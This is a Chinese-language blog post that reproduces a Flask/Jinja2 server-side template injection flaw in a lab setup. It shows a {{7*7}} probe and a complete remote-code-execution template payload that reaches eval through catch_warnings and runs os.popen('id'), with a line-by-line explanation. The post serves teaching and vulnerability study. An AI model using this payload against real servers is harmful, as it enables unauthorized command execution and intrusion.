---
title: Flask（Jinja2）服务端模板注入漏洞
date: 2026-10-26 00:00:00
tags:
  - 网络安全
  - Web安全
  - SSTI
  - Flask
  - Jinja2
categories:
  - 漏洞复现
---

# Flask（Jinja2）服务端模板注入漏洞

Flask 是一个流行的 Python Web 框架，使用 Jinja2 作为其模板引擎。当用户输入未经适当过滤就直接在 Jinja2 模板中渲染时，可能会导致服务端模板注入（SSTI）漏洞，进而可能导致远程代码执行。

# 攻击链

![image-20261021221656536](/img/flask-ssti/image-20261021221656536.png)

**前提**：目标 Flask 应用把 `?name=` 这类用户输入直接丢进了 `render_template_string()` 渲染，模板语法才会被执行 —— 这就是漏洞（SSTI）。

# Payload

环境启动后，访问 `http://your-ip:8000/` 即可查看到默认页面。

<img src="/blog/img/flask-ssti/image-20261021221052433.png" alt="image-20261021221052433" style="width: 67%;" />

### 第一步：探测

```
http://192.168.162.128:8000/?name={{7*7}}
```

![image-20261021221230354](/img/flask-ssti/image-20261021221230354.png)说明模板解析了7*7，存在SSTI漏洞。

### 第二步命令执行

payload

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

![image-20261021221757623](/img/flask-ssti/image-20261021221757623.png)

# 解析核心Payload

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

第一行

```
{% for c in [].__class__.__base__.__subclasses__() %}
```

**{% %}**这个是逻辑语句（if/for），**{{   }}**这个是把结果输出到页面上。

**核心意思：for 循环：遍历 `object` 的所有子类。**

`[]` 是空列表 → `.__class__` 得到 `list` 类 → `.__base__` 得到 `object`（所有类的祖先）→ `.__subclasses__()` 拿到它的全部子类。意思是：**把 Python 里所有已加载的类都翻出来**，逐个交给 `c`。

第二行

```
{% if c.__name__ == 'catch_warnings' %}
```

if判断：只关心名字叫`catch_warnings` 的那个类。

它来自warning模块，特殊之处：它的方法里挂着所以模块的全局命令空间（里面藏着eval等内置函数）

第三行

```
  {% for b in c.__init__.__globals__.values() %}
```

for循环：遍历 `catch_warnings` 的 `__init__` 方法所属模块的全局变量。

`.__globals__` 返回一个字典，`values()` 取它所有的值。意思是：**把这个类背后的全部全局变量（函数、类、模块…）一个个掏出来**，交给 `b`。

第四行

```
  {% if b.__class__ == {}.__class__ %}
```

**if 判断：`b` 是不是一个字典？** `{}.__class__` 就是 `dict`。含义：**只挑那些本身是字典的全局变量**（因为 `eval` 一般是藏在某个字典 —— 即 `__builtins__` 里的）。

第五行

```
    {% if 'eval' in b.keys() %}
```

**if 判断：这个字典里有没有 `eval` 这个键？** 也就是：**找到那个装着 `eval` 函数的字典**（通常是 `__builtins__`）。

第六行

```
      {{ b['eval']('__import__("os").popen("id").read()') }}
```

**核心一击：调用 `eval` 执行代码，并把结果回显到页面。**

- `__import__("os")` → 导入 `os` 模块
- `.popen("id")` → 执行系统命令 `id`（Linux 下查看当前用户）
- `.read()` → 读取命令输出并显示出来

剩下行

```
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

这四个只是把前面的 `if` / `for` 闭合掉（`endif` 关 `if`，`endfor` 关 `for`），**没有实际逻辑**。

**总结：**

遍历所有类 → 找到 `catch_warnings` → 通过它的全局字典找到装着 `eval` 的 `__builtins__` → 调 `eval` 执行 `os.popen("id")` → 在网页上把命令执行结果打出来。
